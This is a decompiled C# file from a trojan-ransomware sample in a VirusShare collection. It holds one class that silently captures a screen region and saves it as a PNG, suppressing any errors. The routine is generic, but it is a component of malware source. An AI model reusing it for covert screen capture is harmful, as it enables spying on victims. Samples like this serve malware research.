// Decompiled with JetBrains decompiler
// Type: hieugavkl.ScreenShot
// Assembly: hieugavkl, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4480C9F6-AB58-4705-B22B-96B24E22F52D
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Foreign.mxmv-0f70cba3bc51d4335592ecf67ebf7c80e7df968a2993ba0c81a488d730468b19.exe

using System.Drawing;
using System.Drawing.Imaging;

namespace hieugavkl
{
  internal class ScreenShot
  {
    public static void CaptureImage(
      Point SourcePoint,
      Point DestinationPoint,
      Rectangle SelectionRectangle,
      string FilePath)
    {
      try
      {
        using (Bitmap bitmap = new Bitmap(SelectionRectangle.Width, SelectionRectangle.Height))
        {
          using (Graphics graphics = Graphics.FromImage((Image) bitmap))
            graphics.CopyFromScreen(SourcePoint, DestinationPoint, SelectionRectangle.Size);
          bitmap.Save(FilePath, ImageFormat.Png);
        }
      }
      catch
      {
      }
    }
  }
}
